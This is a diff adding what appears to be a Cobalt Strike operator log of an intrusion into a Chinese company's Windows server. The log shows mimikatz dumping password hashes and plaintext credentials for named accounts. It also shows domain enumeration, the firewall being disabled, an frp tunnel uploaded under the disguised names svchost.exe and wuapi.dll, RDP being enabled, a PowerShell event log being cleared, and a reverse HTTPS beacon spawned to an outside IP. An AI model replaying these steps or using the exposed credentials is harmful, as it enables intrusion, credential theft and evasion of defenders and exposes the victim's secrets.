@@ -1,0 +1,1055 @@
+12/21 17:59:57 UTC [metadata] 219.135.130.158 <- 192.168.20.111; computer: OASYSTEM; user: Administrator *; process: IE11-Mfc.exe; pid: 2372; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+12/21 18:00:05 UTC [input] <s09> sleep 1
+12/21 18:00:05 UTC [task] <T1029> Tasked beacon to sleep for 1s
+12/21 18:00:17 UTC [checkin] host called home, sent: 16 bytes
+12/21 18:01:02 UTC [input] <s09> logonpasswords
+12/21 18:01:02 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+12/21 18:01:03 UTC [checkin] host called home, sent: 296058 bytes
+12/21 18:01:05 UTC [output]
+received output:
+
+Authentication Id : 0 ; 5228625 (00000000:004fc851)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : OASYSTEM
+Logon Server      : OASYSTEM
+Logon Time        : 2023/8/31 13:59:24
+SID               : S-1-5-21-4231912500-1674961211-2036398625-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 7386fef77ea0e854356b838ccfc6a39d
+	 * SHA1     : a6bad6fa8c7433912d86b9a4583fce1883dfb166
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : OASYSTEM
+	 * NTLM     : 7386fef77ea0e854356b838ccfc6a39d
+	 * SHA1     : a6bad6fa8c7433912d86b9a4583fce1883dfb166
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : OASYSTEM
+	 * Password : SYSTECchina3706
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : OASYSTEM
+	 * Password : (null)
+	ssp :	
+	 [00000000]
+	 * Username : zhouzy
+	 * Domain   : SYSTEC
+	 * Password : Javadf@2023
+	credman :	
+	 [00000000]
+	 * Username : SYSTEC\zhouzy
+	 * Domain   : nas.systec.com.cn
+	 * Password : Javadf@2023
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : OASYSTEM$
+Domain            : SYSTEC
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:43:27
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : OASYSTEM$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	kerberos :	
+	 * Username : oasystem$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:43:30
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 54869 (00000000:0000d655)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:43:01
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : OASYSTEM$
+Domain            : SYSTEC
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:42:58
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : OASYSTEM$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	kerberos :	
+	 * Username : oasystem$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
+12/21 18:01:38 UTC [input] <s09> shell whoami
+12/21 18:01:38 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 18:01:39 UTC [checkin] host called home, sent: 37 bytes
+12/21 18:01:40 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 18:03:38 UTC [input] <s09> shell net time /domain
+12/21 18:03:38 UTC [task] <T1059> Tasked beacon to run: net time /domain
+12/21 18:03:39 UTC [checkin] host called home, sent: 47 bytes
+12/21 18:03:39 UTC [output]
+received output:
+找不到域 SYSTEC 的域控制器。
+
+请键入 NET HELPMSG 3913 以获得更多的帮助。
+
+
+
+12/21 18:03:52 UTC [input] <s09> net group "Domain Controllers" /domain
+12/21 18:03:52 UTC [error] net error: argument '"Domain' is not a \\target
+12/21 18:03:56 UTC [input] <s09> shell net group "Domain Controllers" /domain
+12/21 18:03:56 UTC [task] <T1059> Tasked beacon to run: net group "Domain Controllers" /domain
+12/21 18:03:57 UTC [checkin] host called home, sent: 69 bytes
+12/21 18:03:57 UTC [output]
+received output:
+这项请求将在域 SYSTEC 的域控制器处理。
+
+发生系统错误 1355。
+
+指定的域不存在，或无法联系。
+
+
+
+12/21 18:04:12 UTC [input] <s09> shell nltest /DCLIST:domainName
+12/21 18:04:12 UTC [task] <T1059> Tasked beacon to run: nltest /DCLIST:domainName
+12/21 18:04:12 UTC [checkin] host called home, sent: 56 bytes
+12/21 18:04:17 UTC [output]
+received output:
+找不到 DC，无法获取 DC 列表。Status = 1355 0x54b ERROR_NO_SUCH_DOMAIN
+此命令成功完成
+
+
+12/21 18:04:36 UTC [input] <s09> shell Nslookup -type=SRV _ldap._tcp
+12/21 18:04:36 UTC [task] <T1059> Tasked beacon to run: Nslookup -type=SRV _ldap._tcp
+12/21 18:04:36 UTC [checkin] host called home, sent: 60 bytes
+12/21 18:04:37 UTC [output]
+received output:
+*** dc8.systec.com.cn 找不到 _ldap._tcp: Non-existent domain
+
+服务器:  dc8.systec.com.cn
+Address:  192.168.20.220
+
+
+
+12/21 18:05:07 UTC [input] <s09> shell systeminfo
+12/21 18:05:07 UTC [task] <T1059> Tasked beacon to run: systeminfo
+12/21 18:05:07 UTC [checkin] host called home, sent: 41 bytes
+12/21 18:05:27 UTC [input] <s09> shell systeminfo
+12/21 18:05:27 UTC [task] <T1059> Tasked beacon to run: systeminfo
+12/21 18:05:27 UTC [checkin] host called home, sent: 41 bytes
+12/21 18:05:37 UTC [output]
+received output:
+
+主机名:           OASYSTEM
+OS 名称:          Microsoft Windows Server 2008 R2 Enterprise 
+OS 版本:          6.1.7601 Service Pack 1 Build 7601
+OS 制造商:        Microsoft Corporation
+OS 配置:          独立服务器
+OS 构件类型:      Multiprocessor Free
+注册的所有人:     Windows 用户
+注册的组织:       
+产品 ID:          55041-262-1081855-84071
+初始安装日期:     2012/3/18, 12:42:33
+系统启动时间:     2023/8/31, 9:41:28
+系统制造商:       VMware, Inc.
+系统型号:         VMware Virtual Platform
+系统类型:         x64-based PC
+处理器:           安装了 2 个处理器。
+                  [01]: Intel64 Family 6 Model 45 Stepping 7 GenuineIntel ~2194 Mhz
+                  [02]: Intel64 Family 6 Model 45 Stepping 7 GenuineIntel ~2194 Mhz
+BIOS 版本:        Phoenix Technologies LTD 6.00, 2015/9/21
+Windows 目录:     C:\Windows
+系统目录:         C:\Windows\system32
+启动设备:         \Device\HarddiskVolume1
+系统区域设置:     zh-cn;中文(中国)
+输入法区域设置:   zh-cn;中文(中国)
+时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量:     16,384 MB
+可用的物理内存:   5,434 MB
+虚拟内存: 最大值: 32,765 MB
+虚拟内存: 可用:   16,132 MB
+虚拟内存: 使用中: 16,633 MB
+页面文件位置:     C:\pagefile.sys
+域:               SYSTEC
+登录服务器:       \\OASYSTEM
+修补程序:         安装了 213 个修补程序。
+                  [01]: KB981391
+                  [02]: KB981392
+                  [03]: KB977236
+                  [04]: KB981111
+                  [05]: KB977238
+                  [06]: KB2849697
+                  [07]: KB2849696
+                  [08]: KB2841134
+                  [09]: KB2841134
+                  [10]: KB977239
+                  [11]: KB2670838
+                  [12]: KB981390
+                  [13]: KB2386667
+                  [14]: KB2506212
+                  [15]: KB2506928
+                  [16]: KB2509553
+                  [17]: KB2511455
+                  [18]: KB2536275
+                  [19]: KB2544893
+                  [20]: KB2545698
+                  [21]: KB2547666
+                  [22]: KB2552343
+                  [23]: KB2560656
+                  [24]: KB2563227
+                  [25]: KB2564958
+                  [26]: KB2570947
+                  [27]: KB2585542
+                  [28]: KB2603229
+                  [29]: KB2604115
+                  [30]: KB2607047
+                  [31]: KB2608658
+                  [32]: KB2620704
+                  [33]: KB2621440
+                  [34]: KB2631813
+                  [35]: KB2640148
+                  [36]: KB2643719
+                  [37]: KB2653956
+                  [38]: KB2654428
+                  [39]: KB2660075
+                  [40]: KB2667402
+                  [41]: KB2676562
+                  [42]: KB2685811
+                  [43]: KB2685813
+                  [44]: KB2685939
+                  [45]: KB2690533
+                  [46]: KB2698365
+                  [47]: KB2705219
+                  [48]: KB2706045
+                  [49]: KB2718704
+                  [50]: KB2719857
+                  [51]: KB2726535
+                  [52]: KB2729094
+                  [53]: KB2732059
+                  [54]: KB2742599
+                  [55]: KB2750841
+                  [56]: KB2761217
+                  [57]: KB2763523
+                  [58]: KB2765809
+                  [59]: KB2770660
+                  [60]: KB2786081
+                  [61]: KB2789645
+                  [62]: KB2791765
+                  [63]: KB2798162
+                  [64]: KB2800095
+                  [65]: KB2807986
+                  [66]: KB2808679
+                  [67]: KB2813430
+                  [68]: KB2834140
+                  [69]: KB2836943
+                  [70]: KB2840149
+                  [71]: KB2843630
+                  [72]: KB2852386
+                  [73]: KB2853952
+                  [74]: KB2862152
+                  [75]: KB2862330
+                  [76]: KB2862335
+                  [77]: KB2864202
+                  [78]: KB2868038
+                  [79]: KB2868116
+                  [80]: KB2868626
+                  [81]: KB2871997
+                  [82]: KB2882822
+                  [83]: KB2884256
+                  [84]: KB2888049
+                  [85]: KB2891804
+                  [86]: KB2892074
+                  [87]: KB2893294
+                  [88]: KB2893519
+                  [89]: KB2894844
+                  [90]: KB2900986
+                  [91]: KB2908783
+                  [92]: KB2911501
+                  [93]: KB2912390
+                  [94]: KB2929733
+                  [95]: KB2931356
+                  [96]: KB2937610
+                  [97]: KB2957189
+                  [98]: KB2966583
+                  [99]: KB2968294
+                  [100]: KB2970228
+                  [101]: KB2972100
+                  [102]: KB2973201
+                  [103]: KB2973351
+                  [104]: KB2977292
+                  [105]: KB2978120
+                  [106]: KB2984972
+                  [107]: KB2985461
+                  [108]: KB2991963
+                  [109]: KB2992611
+                  [110]: KB2993651
+                  [111]: KB2999226
+                  [112]: KB3003743
+                  [113]: KB3004361
+                  [114]: KB3004375
+                  [115]: KB3005607
+                  [116]: KB3006137
+                  [117]: KB3006625
+                  [118]: KB3010788
+                  [119]: KB3011780
+                  [120]: KB3018238
+                  [121]: KB3019978
+                  [122]: KB3020369
+                  [123]: KB3020370
+                  [124]: KB3021674
+                  [125]: KB3022777
+                  [126]: KB3023215
+                  [127]: KB3030377
+                  [128]: KB3033889
+                  [129]: KB3033929
+                  [130]: KB3035126
+                  [131]: KB3035132
+                  [132]: KB3037574
+                  [133]: KB3040272
+                  [134]: KB3042058
+                  [135]: KB3042553
+                  [136]: KB3045685
+                  [137]: KB3046017
+                  [138]: KB3046269
+                  [139]: KB3054205
+                  [140]: KB3054476
+                  [141]: KB3055642
+                  [142]: KB3060716
+                  [143]: KB3068457
+                  [144]: KB3068708
+                  [145]: KB3071756
+                  [146]: KB3072630
+                  [147]: KB3074543
+                  [148]: KB3075220
+                  [149]: KB3076895
+                  [150]: KB3078601
+                  [151]: KB3078667
+                  [152]: KB3080149
+                  [153]: KB3080446
+                  [154]: KB3084135
+                  [155]: KB3086255
+                  [156]: KB3087039
+                  [157]: KB3092601
+                  [158]: KB3092627
+                  [159]: KB3097989
+                  [160]: KB3101722
+                  [161]: KB3107998
+                  [162]: KB3108371
+                  [163]: KB3108381
+                  [164]: KB3108664
+                  [165]: KB3108670
+                  [166]: KB3109094
+                  [167]: KB3109103
+                  [168]: KB3109560
+                  [169]: KB3110329
+                  [170]: KB3118401
+                  [171]: KB3121255
+                  [172]: KB3122648
+                  [173]: KB3123479
+                  [174]: KB3124275
+                  [175]: KB3126587
+                  [176]: KB3127220
+                  [177]: KB3133043
+                  [178]: KB3133977
+                  [179]: KB3135983
+                  [180]: KB3137061
+                  [181]: KB3138612
+                  [182]: KB3138901
+                  [183]: KB3139398
+                  [184]: KB3139914
+                  [185]: KB3139923
+                  [186]: KB3139940
+                  [187]: KB3140245
+                  [188]: KB3142024
+                  [189]: KB3145739
+                  [190]: KB3146706
+                  [191]: KB3146963
+                  [192]: KB3147071
+                  [193]: KB3149090
+                  [194]: KB3153171
+                  [195]: KB3156016
+                  [196]: KB3156017
+                  [197]: KB3156019
+                  [198]: KB3159398
+                  [199]: KB3161561
+                  [200]: KB3161949
+                  [201]: KB3161958
+                  [202]: KB3162835
+                  [203]: KB3163245
+                  [204]: KB3164033
+                  [205]: KB3164035
+                  [206]: KB3168965
+                  [207]: KB3170106
+                  [208]: KB3170455
+                  [209]: KB4012212
+                  [210]: KB958488
+                  [211]: KB976902
+                  [212]: KB976932
+                  [213]: KB982018
+网卡:             安装了 2 个 NIC。
+                  [01]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接
+                      启用 DHCP:   否
+                      IP 地址
+                        [01]: 192.168.20.111
+                  [02]: Sangfor SSL VPN CS Support System VNIC
+                      连接名:      本地连接 2
+                      状态:        媒体连接已中断
+
+
+12/21 18:05:49 UTC [output]
+received output:
+
+主机名:           OASYSTEM
+OS 名称:          Microsoft Windows Server 2008 R2 Enterprise 
+OS 版本:          6.1.7601 Service Pack 1 Build 7601
+OS 制造商:        Microsoft Corporation
+OS 配置:          独立服务器
+OS 构件类型:      Multiprocessor Free
+注册的所有人:     Windows 用户
+注册的组织:       
+产品 ID:          55041-262-1081855-84071
+初始安装日期:     2012/3/18, 12:42:33
+系统启动时间:     2023/8/31, 9:41:28
+系统制造商:       VMware, Inc.
+系统型号:         VMware Virtual Platform
+系统类型:         x64-based PC
+处理器:           安装了 2 个处理器。
+                  [01]: Intel64 Family 6 Model 45 Stepping 7 GenuineIntel ~2194 Mhz
+                  [02]: Intel64 Family 6 Model 45 Stepping 7 GenuineIntel ~2194 Mhz
+BIOS 版本:        Phoenix Technologies LTD 6.00, 2015/9/21
+Windows 目录:     C:\Windows
+系统目录:         C:\Windows\system32
+启动设备:         \Device\HarddiskVolume1
+系统区域设置:     zh-cn;中文(中国)
+输入法区域设置:   zh-cn;中文(中国)
+时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量:     16,384 MB
+可用的物理内存:   5,427 MB
+虚拟内存: 最大值: 32,765 MB
+虚拟内存: 可用:   16,121 MB
+虚拟内存: 使用中: 16,644 MB
+页面文件位置:     C:\pagefile.sys
+域:               SYSTEC
+登录服务器:       \\OASYSTEM
+修补程序:         安装了 213 个修补程序。
+                  [01]: KB981391
+                  [02]: KB981392
+                  [03]: KB977236
+                  [04]: KB981111
+                  [05]: KB977238
+                  [06]: KB2849697
+                  [07]: KB2849696
+                  [08]: KB2841134
+                  [09]: KB2841134
+                  [10]: KB977239
+                  [11]: KB2670838
+                  [12]: KB981390
+                  [13]: KB2386667
+                  [14]: KB2506212
+                  [15]: KB2506928
+                  [16]: KB2509553
+                  [17]: KB2511455
+                  [18]: KB2536275
+                  [19]: KB2544893
+                  [20]: KB2545698
+                  [21]: KB2547666
+                  [22]: KB2552343
+                  [23]: KB2560656
+                  [24]: KB2563227
+                  [25]: KB2564958
+                  [26]: KB2570947
+                  [27]: KB2585542
+                  [28]: KB2603229
+                  [29]: KB2604115
+                  [30]: KB2607047
+                  [31]: KB2608658
+                  [32]: KB2620704
+                  [33]: KB2621440
+                  [34]: KB2631813
+                  [35]: KB2640148
+                  [36]: KB2643719
+                  [37]: KB2653956
+                  [38]: KB2654428
+                  [39]: KB2660075
+                  [40]: KB2667402
+                  [41]: KB2676562
+                  [42]: KB2685811
+                  [43]: KB2685813
+                  [44]: KB2685939
+                  [45]: KB2690533
+                  [46]: KB2698365
+                  [47]: KB2705219
+                  [48]: KB2706045
+                  [49]: KB2718704
+                  [50]: KB2719857
+                  [51]: KB2726535
+                  [52]: KB2729094
+                  [53]: KB2732059
+                  [54]: KB2742599
+                  [55]: KB2750841
+                  [56]: KB2761217
+                  [57]: KB2763523
+                  [58]: KB2765809
+                  [59]: KB2770660
+                  [60]: KB2786081
+                  [61]: KB2789645
+                  [62]: KB2791765
+                  [63]: KB2798162
+                  [64]: KB2800095
+                  [65]: KB2807986
+                  [66]: KB2808679
+                  [67]: KB2813430
+                  [68]: KB2834140
+                  [69]: KB2836943
+                  [70]: KB2840149
+                  [71]: KB2843630
+                  [72]: KB2852386
+                  [73]: KB2853952
+                  [74]: KB2862152
+                  [75]: KB2862330
+                  [76]: KB2862335
+                  [77]: KB2864202
+                  [78]: KB2868038
+                  [79]: KB2868116
+                  [80]: KB2868626
+                  [81]: KB2871997
+                  [82]: KB2882822
+                  [83]: KB2884256
+                  [84]: KB2888049
+                  [85]: KB2891804
+                  [86]: KB2892074
+                  [87]: KB2893294
+                  [88]: KB2893519
+                  [89]: KB2894844
+                  [90]: KB2900986
+                  [91]: KB2908783
+                  [92]: KB2911501
+                  [93]: KB2912390
+                  [94]: KB2929733
+                  [95]: KB2931356
+                  [96]: KB2937610
+                  [97]: KB2957189
+                  [98]: KB2966583
+                  [99]: KB2968294
+                  [100]: KB2970228
+                  [101]: KB2972100
+                  [102]: KB2973201
+                  [103]: KB2973351
+                  [104]: KB2977292
+                  [105]: KB2978120
+                  [106]: KB2984972
+                  [107]: KB2985461
+                  [108]: KB2991963
+                  [109]: KB2992611
+                  [110]: KB2993651
+                  [111]: KB2999226
+                  [112]: KB3003743
+                  [113]: KB3004361
+                  [114]: KB3004375
+                  [115]: KB3005607
+                  [116]: KB3006137
+                  [117]: KB3006625
+                  [118]: KB3010788
+                  [119]: KB3011780
+                  [120]: KB3018238
+                  [121]: KB3019978
+                  [122]: KB3020369
+                  [123]: KB3020370
+                  [124]: KB3021674
+                  [125]: KB3022777
+                  [126]: KB3023215
+                  [127]: KB3030377
+                  [128]: KB3033889
+                  [129]: KB3033929
+                  [130]: KB3035126
+                  [131]: KB3035132
+                  [132]: KB3037574
+                  [133]: KB3040272
+                  [134]: KB3042058
+                  [135]: KB3042553
+                  [136]: KB3045685
+                  [137]: KB3046017
+                  [138]: KB3046269
+                  [139]: KB3054205
+                  [140]: KB3054476
+                  [141]: KB3055642
+                  [142]: KB3060716
+                  [143]: KB3068457
+                  [144]: KB3068708
+                  [145]: KB3071756
+                  [146]: KB3072630
+                  [147]: KB3074543
+                  [148]: KB3075220
+                  [149]: KB3076895
+                  [150]: KB3078601
+                  [151]: KB3078667
+                  [152]: KB3080149
+                  [153]: KB3080446
+                  [154]: KB3084135
+                  [155]: KB3086255
+                  [156]: KB3087039
+                  [157]: KB3092601
+                  [158]: KB3092627
+                  [159]: KB3097989
+                  [160]: KB3101722
+                  [161]: KB3107998
+                  [162]: KB3108371
+                  [163]: KB3108381
+                  [164]: KB3108664
+                  [165]: KB3108670
+                  [166]: KB3109094
+                  [167]: KB3109103
+                  [168]: KB3109560
+                  [169]: KB3110329
+                  [170]: KB3118401
+                  [171]: KB3121255
+                  [172]: KB3122648
+                  [173]: KB3123479
+                  [174]: KB3124275
+                  [175]: KB3126587
+                  [176]: KB3127220
+                  [177]: KB3133043
+                  [178]: KB3133977
+                  [179]: KB3135983
+                  [180]: KB3137061
+                  [181]: KB3138612
+                  [182]: KB3138901
+                  [183]: KB3139398
+                  [184]: KB3139914
+                  [185]: KB3139923
+                  [186]: KB3139940
+                  [187]: KB3140245
+                  [188]: KB3142024
+                  [189]: KB3145739
+                  [190]: KB3146706
+                  [191]: KB3146963
+                  [192]: KB3147071
+                  [193]: KB3149090
+                  [194]: KB3153171
+                  [195]: KB3156016
+                  [196]: KB3156017
+                  [197]: KB3156019
+                  [198]: KB3159398
+                  [199]: KB3161561
+                  [200]: KB3161949
+                  [201]: KB3161958
+                  [202]: KB3162835
+                  [203]: KB3163245
+                  [204]: KB3164033
+                  [205]: KB3164035
+                  [206]: KB3168965
+                  [207]: KB3170106
+                  [208]: KB3170455
+                  [209]: KB4012212
+                  [210]: KB958488
+                  [211]: KB976902
+                  [212]: KB976932
+                  [213]: KB982018
+网卡:             安装了 2 个 NIC。
+                  [01]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接
+                      启用 DHCP:   否
+                      IP 地址
+                        [01]: 192.168.20.111
+                  [02]: Sangfor SSL VPN CS Support System VNIC
+                      连接名:      本地连接 2
+                      状态:        媒体连接已中断
+
+
+12/21 18:09:54 UTC [output]
+-------------------------------------------------------------关闭防火墙(win03+)----------------------------------------------------------------
+
+12/21 18:09:54 UTC [task] <T1059> Tasked beacon to run: netsh advfirewall set allprofiles state off
+12/21 18:09:54 UTC [checkin] host called home, sent: 74 bytes
+12/21 18:10:01 UTC [output]
+received output:
+确定。
+
+
+
+12/21 18:10:10 UTC [output]
+-------------------------------------------------------------查看防火墙配置-------------------------------------------------------------
+
+12/21 18:10:10 UTC [task] <T1059> Tasked beacon to run: netsh firewall show config
+12/21 18:10:11 UTC [checkin] host called home, sent: 57 bytes
+12/21 18:10:13 UTC [output]
+received output:
+
+域 配置文件配置:
+-------------------------------------------------------------------
+操作模式                          = 禁用
+例外模式                          = 启用
+多播/广播响应模式                 = 启用
+通知模式                          = 禁用
+
+域 配置文件的服务配置文件:
+模式     自定义      名称
+-------------------------------------------------------------------
+启用       否           文件和打印机共享
+
+域 配置文件的允许的程序配置:
+模式     流量方向             名称/程序
+-------------------------------------------------------------------
+
+域 配置文件的端口配置:
+端口   协议    流量方向              名称
+-------------------------------------------------------------------
+25901  TCP       启用      入站                    Trend Micro OfficeScan Listener
+33060  TCP       启用      入站                    Port 33060
+3306   TCP       启用      入站                    Port 3306
+3306   TCP       启用      入站                    Port 3306
+51111  TCP       启用      入站                    Mstsc
+51002  TCP       启用      入站                    MIS-51002
+443    TCP       启用      入站                    MIS HTTPS端口
+3306   TCP       启用      入站                    msql
+80     TCP       启用      入站                    http
+
+域 配置文件的 ICMP 配置:
+模式     类型  描述
+-------------------------------------------------------------------
+启用       2     允许出站数据包太大
+启用       8     允许入站回显请求
+
+标准 配置文件配置(当前):
+-------------------------------------------------------------------
+操作模式                          = 禁用
+例外模式                          = 启用
+多播/广播响应模式                 = 启用
+通知模式                          = 禁用
+
+标准 配置文件的服务配置文件:
+模式     自定义      名称
+-------------------------------------------------------------------
+启用       否           文件和打印机共享
+
+标准 配置文件的允许的程序配置:
+模式     流量方向             名称/程序
+-------------------------------------------------------------------
+
+标准 配置文件的端口配置:
+端口   协议    流量方向              名称
+-------------------------------------------------------------------
+25901  TCP       启用      入站                    Trend Micro OfficeScan Listener
+33060  TCP       启用      入站                    Port 33060
+3306   TCP       启用      入站                    Port 3306
+3306   TCP       启用      入站                    Port 3306
+51111  TCP       启用      入站                    Mstsc
+51002  TCP       启用      入站                    MIS-51002
+443    TCP       启用      入站                    MIS HTTPS端口
+3306   TCP       启用      入站                    msql
+80     TCP       启用      入站                    http
+
+标准 配置文件的 ICMP 配置:
+模式     类型  描述
+-------------------------------------------------------------------
+启用       2     允许出站数据包太大
+启用       8     允许入站回显请求
+
+日志配置:
+-------------------------------------------------------------------
+文件位置        = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+文件大小上限    = 4096 KB
+丢弃的数据包数  = 禁用
+连接数          = 禁用
+
+重要信息: 已成功执行命令。
+但不赞成使用 "netsh firewall"；
+而应该使用 "netsh advfirewall firewall"。
+有关使用 "netsh advfirewall firewall" 命令
+而非 "netsh firewall" 的详细信息，请参阅
+http://go.microsoft.com/fwlink/?linkid=121488
+上的 KB 文章 947709。
+
+
+
+
+12/21 18:11:02 UTC [input] <s09> shell netsh advfirewall show allprofiles
+12/21 18:11:02 UTC [task] <T1059> Tasked beacon to run: netsh advfirewall show allprofiles
+12/21 18:11:03 UTC [checkin] host called home, sent: 65 bytes
+12/21 18:11:03 UTC [output]
+received output:
+
+域配置文件 设置: 
+----------------------------------------------------------------------
+状态                                  关闭
+防火墙策略                          BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (仅 GPO 存储)
+LocalConSecRules                      N/A (仅 GPO 存储)
+InboundUserNotification               禁用
+RemoteManagement                      禁用
+UnicastResponseToMulticast            启用
+
+日志:
+LogAllowedConnections                 禁用
+LogDroppedConnections                 禁用
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+专用配置文件 设置: 
+----------------------------------------------------------------------
+状态                                  关闭
+防火墙策略                          BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (仅 GPO 存储)
+LocalConSecRules                      N/A (仅 GPO 存储)
+InboundUserNotification               禁用
+RemoteManagement                      禁用
+UnicastResponseToMulticast            启用
+
+日志:
+LogAllowedConnections                 禁用
+LogDroppedConnections                 禁用
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+公用配置文件 设置: 
+----------------------------------------------------------------------
+状态                                  关闭
+防火墙策略                          BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (仅 GPO 存储)
+LocalConSecRules                      N/A (仅 GPO 存储)
+InboundUserNotification               禁用
+RemoteManagement                      禁用
+UnicastResponseToMulticast            启用
+
+日志:
+LogAllowedConnections                 禁用
+LogDroppedConnections                 禁用
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+确定。
+
+
+
+12/21 18:11:24 UTC [output]
+-------------------------------------------------------------上传frpPRO------------------------------------------------------------
+
+12/21 18:11:27 UTC [task] <> cd C:\Windows\system32\wbem
+12/21 18:11:27 UTC [task] <T1029> Tasked beacon to become interactive
+12/21 18:11:28 UTC [checkin] host called home, sent: 48 bytes
+12/21 18:11:36 UTC [task] <> Tasked beacon to upload D:\QYchanj\TOOLS\CS相关\CS插件\QYchanj的插件\script\exe\frpPRO\x64\svchost.exe as svchost.exe
+12/21 18:11:38 UTC [checkin] host called home, sent: 786455 bytes
+12/21 18:11:40 UTC [checkin] host called home, sent: 780357 bytes
+12/21 18:11:43 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:11:47 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:11:50 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:11:54 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:11:56 UTC [indicator] file: 7b91c5d982789a7b1deac9e727f37a71 9910784 bytes svchost.exe
+12/21 18:11:58 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:12:01 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:12:04 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:12:08 UTC [checkin] host called home, sent: 1040476 bytes
+12/21 18:12:11 UTC [checkin] host called home, sent: 21034 bytes
+12/21 18:14:16 UTC [output]
+-------------------------------------------------------------开启RDP服务-------------------------------------------------------------
+
+12/21 18:14:16 UTC [task] <T1086, T1064> Tasked beacon to import: D:\QYchanj\TOOLS\CS相关\CS插件\谢公子插件\CS插件\powershell\RegfDenyTSConnections.ps1
+12/21 18:14:16 UTC [task] <T1086, T1093> Tasked beacon to run: RegfDenyTSConnections 0 (unmanaged)
+12/21 18:14:16 UTC [checkin] host called home, sent: 642 bytes
+12/21 18:14:17 UTC [task] <T1059> Tasked beacon to run: wevtutil cl "Windows PowerShell"
+12/21 18:14:17 UTC [checkin] host called home, sent: 134830 bytes
+12/21 18:14:35 UTC [output]
+received output:
+Old status (0 open / 1 close):  0
+New status (0 open / 1 close):  0
+
+
+12/21 18:14:38 UTC [output]
+-------------------------------------------------------------上传配置文件ini1------------------------------------------------------------
+
+12/21 18:14:40 UTC [task] <> cd C:\Windows\system32\wbem
+12/21 18:14:40 UTC [task] <T1029> Tasked beacon to become interactive
+12/21 18:14:40 UTC [task] <> Tasked beacon to upload D:\QYchanj\TOOLS\CS相关\CS插件\QYchanj的插件\script\exe\frpPRO\x64\ini1\wuapi.dll as wuapi.dll
+12/21 18:14:40 UTC [indicator] file: 0575e60e9e3fe7908519ac71182d0fa7 256 bytes wuapi.dll
+12/21 18:14:40 UTC [checkin] host called home, sent: 325 bytes
+12/21 18:14:56 UTC [output]
+-------------------------------------------------------------运行frpPRO------------------------------------------------------------
+
+12/21 18:15:15 UTC [output]
+-------------------------------------------------------------运行frpPRO------------------------------------------------------------
+
+12/21 18:15:27 UTC [checkin] host called home, sent: 42 bytes
+12/21 18:15:43 UTC [input] <niko> spawn HL
+12/21 18:15:44 UTC [task] <T1093> Tasked beacon to spawn (x64) windows/beacon_https/reverse_https (8.134.80.227:443)
+12/21 18:15:44 UTC [checkin] host called home, sent: 261649 bytes
+12/21 18:16:01 UTC [output]
+-------------------------------------------------------------运行frpPRO------------------------------------------------------------
+
+12/21 18:16:27 UTC [output]
+-------------------------------------------------------------运行frpPRO------------------------------------------------------------
+
+12/21 18:16:34 UTC [task] <T1059> Tasked beacon to run: svchost.exe -c C:\Windows\system32\wbem\wuapi.dll 
+12/21 18:16:34 UTC [task] <T1029> Tasked beacon to sleep for 30s
+12/21 18:16:34 UTC [checkin] host called home, sent: 97 bytes
+12/21 18:16:34 UTC [output]
+received output:
+2023/12/22 02:16:19 [I] [value.go:76] local path
+2023/12/22 02:16:19 [W] [service.go:101] login to server failed: EOF
+EOF
+
+
+12/21 18:17:23 UTC [input] <niko> shell type C:\Windows\system32\wbem\wuapi.dll
+12/21 18:17:23 UTC [task] <T1059> Tasked beacon to run: type C:\Windows\system32\wbem\wuapi.dll
+12/21 18:17:34 UTC [checkin] host called home, sent: 70 bytes
